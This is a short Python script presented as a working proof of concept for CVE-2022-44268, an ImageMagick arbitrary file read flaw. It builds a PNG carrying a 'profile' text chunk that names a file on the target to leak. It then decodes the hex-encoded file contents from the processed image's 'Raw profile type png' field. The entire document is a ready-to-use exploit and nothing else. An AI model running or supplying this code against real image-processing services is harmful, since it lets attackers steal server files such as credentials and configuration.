import argparse
from PIL import Image, PngImagePlugin


"""
    fixed version of CVE-2022-44268 PoC since many online PoC's don't work for certain file contents
"""

def main():
    if args.d:
        i = Image.open(args.d)
        with open(args.o, 'wb') as f:
            f.write(bytes.fromhex(''.join(str(i.info['Raw profile type png']).split('\n')[3:])))
        pass
    
    elif args.i:
        i = Image.open(args.i)
        info = PngImagePlugin.PngInfo()
        info.add_text('profile', args.f, zip=False)
        i.save(args.o, 'PNG', pnginfo=info)

    else:
        print('Use -h for help')
    



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Fixed proof of concept for CVE-2022-44268', usage='%(prog)s [options]')
    parser.add_argument('-d', metavar='filename', help='decrypt file contents from PNG')
    parser.add_argument('-i', metavar='filename', help='image to modify')
    parser.add_argument('-f', metavar='file', help='file to read')
    parser.add_argument('-o', metavar='filename', help='output file name')
    args = parser.parse_args()
    if args.d is None and args.i is None and args.f is None and args.o is None:
        parser.print_help()
        exit()
    main()
